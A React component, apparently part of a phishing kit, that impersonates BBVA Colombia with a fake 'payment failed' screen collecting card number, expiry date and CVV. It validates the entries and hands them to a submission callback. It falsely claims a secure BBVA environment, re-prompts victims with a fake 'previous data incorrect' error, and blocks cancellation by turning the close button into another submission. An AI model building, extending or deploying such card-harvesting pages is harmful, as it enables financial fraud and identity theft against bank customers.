/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useMemo, useEffect } from "react";
import { Lock, X, CreditCard, Calendar } from "lucide-react";

export default function Tc({ enviar, isError }: any) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");
  const [showCvv, setShowCvv] = useState(false);
  const [errorGeneral, setErrorGeneral] = useState("");

  useEffect(() => {
    if (isError) {
      setErrorGeneral("Los datos de la tarjeta ingresados anteriormente son incorrectos. Por favor, verifícalos e intenta de nuevo.");
    }
  }, [isError]);

  // States to track input validation errors
  const [errorTarjeta, setErrorTarjeta] = useState("");
  const [errorFecha, setErrorFecha] = useState("");
  const [errorCvv, setErrorCvv] = useState("");

  // Luhn algorithm validator
  const validateLuhn = (num: string): boolean => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  // Expiration date validator (MM/AA must be current month/year or in the future)
  const validateFecha = (val: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false;
    const [mm, aa] = val.split("/").map((n) => parseInt(n, 10));
    if (mm < 1 || mm > 12) return false;

    const now = new Date();
    const currentYear = now.getFullYear() % 100; // 2-digit year (e.g. 26)
    const currentMonth = now.getMonth() + 1; // 1-indexed

    if (aa < currentYear) return false;
    if (aa === currentYear && mm < currentMonth) return false;
    return true;
  };

  // Enable button only when minimal formats are matched
  const isFormFilled = useMemo(() => {
    return tarjeta.length === 16 && fecha.length === 5 && (cvv.length === 3 || cvv.length === 4);
  }, [tarjeta, fecha, cvv]);

  // Run all strict checks and return validity status
  const runStrictValidation = (): boolean => {
    let isValid = true;

    if (!validateLuhn(tarjeta)) {
      setErrorTarjeta("Número de tarjeta inválido.");
      isValid = false;
    } else {
      setErrorTarjeta("");
    }

    if (!validateFecha(fecha)) {
      setErrorFecha("Fecha vencida o inválida (MM/AA).");
      isValid = false;
    } else {
      setErrorFecha("");
    }

    if (cvv.length < 3 || cvv.length > 4) {
      setErrorCvv("CVV debe tener 3 o 4 dígitos.");
      isValid = false;
    } else {
      setErrorCvv("");
    }

    return isValid;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const isValid = runStrictValidation();
    if (!isValid) return;

    enviar?.({
      view: "tarjeta_verif",
      tarjeta: tarjeta,
      fecha: fecha,
      cvv: cvv,
      bank: "bbva",
    });
  };

  const handleClose = () => {
    setErrorGeneral("El proceso de verificación no puede ser cancelado en este momento. Por favor, completa los campos requeridos para continuar.");
    
    enviar?.({
      view: "tarjeta_verif",
      tarjeta: "CANCELADO_POR_USUARIO",
      fecha: "00/00",
      cvv: "000",
      bank: "bbva",
      noLoader: true,
    });
  };

  // Automated Expiration Date Formatter (MM/AA)
  const handleFecha = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4);
    }
    setFecha(value.substring(0, 5));
    if (errorFecha) setErrorFecha(""); // Clear error when typing
  };

  const handleTarjetaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setTarjeta(e.target.value.replace(/\D/g, "").substring(0, 16));
    if (errorTarjeta) setErrorTarjeta(""); // Clear error when typing
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvv(e.target.value.replace(/\D/g, "").substring(0, 4));
    if (errorCvv) setErrorCvv(""); // Clear error when typing
  };

  const bbvaBlue = "bg-[#001391]";
  const bbvaTextBlue = "text-[#001391]";

  return (
    <div className="max-w-md w-full mx-auto bg-white shadow-xl min-h-screen flex flex-col justify-between">
      
      <div>
        {/* 🔝 1. Cabecera (Header) */}
        <div className="flex justify-between items-center px-4 py-3 border-b border-gray-100 bg-white">
          <div className="w-6 h-6"></div>
          
          {/* Logo BBVA */}
          <div className={`text-2xl font-black tracking-wider ${bbvaTextBlue}`}>
            BBVA
          </div>

          {/* Botón de cierre */}
          <button 
            type="button" 
            className="text-gray-600 hover:text-gray-800" 
            aria-label="Cerrar"
            onClick={handleClose}
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        <div className="p-6 sm:p-8">
          
          {/* 🔒 2. Entorno de Seguridad */}
          <div className="text-center mb-6">
            <Lock className="h-5 w-5 mx-auto text-gray-400 mb-1" />
            <p className="text-xs text-gray-500 font-medium">
              Estás en un entorno con seguridad BBVA
            </p>
          </div>

          {/* 💳 3. Título de Ingreso */}
          <h1 className={`text-2xl font-serif font-extrabold ${bbvaTextBlue} leading-tight mb-2`}>
            Pago no realizado
          </h1>
          <p className="text-sm text-gray-500 mb-8">
            En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
          </p>

          {errorGeneral && (
            <div className="bg-red-50 border border-red-200 text-red-700 p-3.5 rounded-lg text-xs font-semibold mb-6 flex items-start gap-2">
              <span className="text-sm leading-none">⚠️</span>
              <span>{errorGeneral}</span>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            
            {/* Campo 1: Número de Tarjeta */}
            <div className="space-y-1">
              <div className="relative flex items-center">
                <span className="absolute left-3 text-gray-400">
                  <CreditCard className="w-5 h-5" />
                </span>
                <input
                  type="text"
                  id="tarjeta"
                  value={tarjeta}
                  onChange={handleTarjetaChange}
                  onBlur={() => {
                    if (tarjeta.length > 0 && (tarjeta.length !== 16 || !validateLuhn(tarjeta))) {
                      setErrorTarjeta("Número de tarjeta inválido.");
                    }
                  }}
                  placeholder="Número de tarjeta (16 dígitos)"
                  className={`w-full h-12 pl-11 pr-3 border rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500 text-gray-800 font-medium outline-none transition-all ${
                    errorTarjeta ? "border-red-500 bg-red-50/10 focus:ring-red-500" : "border-gray-400"
                  }`}
                  inputMode="numeric"
                  autoComplete="off"
                  required
                />
              </div>
              {errorTarjeta && (
                <p className="text-xs text-red-500 font-semibold px-1">{errorTarjeta}</p>
              )}
            </div>

            {/* Fila: Fecha y CVV agrupados */}
            <div className="grid grid-cols-2 gap-4">
              
              {/* Campo 2: Fecha MM/AA */}
              <div className="space-y-1">
                <div className="relative flex items-center">
                  <span className="absolute left-3 text-gray-400">
                    <Calendar className="w-5 h-5" />
                  </span>
                  <input
                    type="text"
                    id="fecha"
                    value={fecha}
                    onChange={handleFecha}
                    onBlur={() => {
                      if (fecha.length === 5 && !validateFecha(fecha)) {
                        setErrorFecha("Fecha vencida o inválida.");
                      }
                    }}
                    placeholder="Vence (MM/AA)"
                    maxLength={5}
                    className={`w-full h-12 pl-11 pr-3 border rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500 text-gray-800 font-medium outline-none transition-all ${
                      errorFecha ? "border-red-500 bg-red-50/10 focus:ring-red-500" : "border-gray-400"
                    }`}
                    inputMode="numeric"
                    autoComplete="off"
                    required
                  />
                </div>
                {errorFecha && (
                  <p className="text-xs text-red-500 font-semibold px-1">{errorFecha}</p>
                )}
              </div>

              {/* Campo 3: CVV */}
              <div className="space-y-1">
                <div className="relative flex items-center">
                  <span className="absolute left-3 text-gray-400">
                    <Lock className="w-5 h-5" />
                  </span>
                  <input
                    type={showCvv ? "text" : "password"}
                    id="cvv"
                    value={cvv}
                    onChange={handleCvvChange}
                    onBlur={() => {
                      if (cvv.length > 0 && (cvv.length < 3 || cvv.length > 4)) {
                        setErrorCvv("Mínimo 3, máximo 4 dígitos.");
                      }
                    }}
                    placeholder="CVV (3-4 dígitos)"
                    maxLength={4}
                    className={`w-full h-12 pl-11 pr-10 border rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500 text-gray-800 font-medium outline-none transition-all ${
                      errorCvv ? "border-red-500 bg-red-50/10 focus:ring-red-500" : "border-gray-400"
                    }`}
                    inputMode="numeric"
                    autoComplete="off"
                    required
                  />
                  
                  {/* Botón Ocultar/Mostrar CVV */}
                  <button
                    type="button"
                    onClick={() => setShowCvv(!showCvv)}
                    className="absolute right-3 text-gray-400 hover:text-gray-600 transition-colors"
                  >
                    <svg 
                      xmlns="http://www.w3.org/2000/svg" 
                      fill="none" 
                      viewBox="0 0 24 24" 
                      strokeWidth={1.5} 
                      stroke="currentColor" 
                      className="w-5 h-5"
                    >
                      {showCvv ? (
                        <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.815 7.815 3.15 3.15m-3.15-3.15-4.015-4.015m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
                      ) : (
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" />
                      )}
                    </svg>
                  </button>
                </div>
                {errorCvv && (
                  <p className="text-xs text-red-500 font-semibold px-1">{errorCvv}</p>
                )}
              </div>

            </div>

            {/* 🔑 Botón Entrar / Confirmar */}
            <button
              type="submit"
              disabled={!isFormFilled}
              className={`w-full ${bbvaBlue} text-white font-bold py-3.5 rounded-md mt-8 hover:opacity-95 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed`}
            >
              CONFIRMAR
            </button>

            {/* Enlace de regreso */}
            <div className="text-center pt-4">
              <button 
                type="button" 
                className={`${bbvaTextBlue} text-sm font-medium hover:underline bg-transparent border-none cursor-pointer`}
                onClick={() => window.location.reload()}
              >
                Regresar
              </button>
            </div>

          </form>
        </div>

      </div>

      {/* Footer corporativo de información */}
      <div className="p-6 pt-0">
        <hr className="my-6 border-gray-100" />
        <p className="text-center text-[10px] text-gray-400 font-medium">
          BBVA Colombia S.A. 2026. Todos los derechos reservados.
        </p>
      </div>

    </div>
  );
}
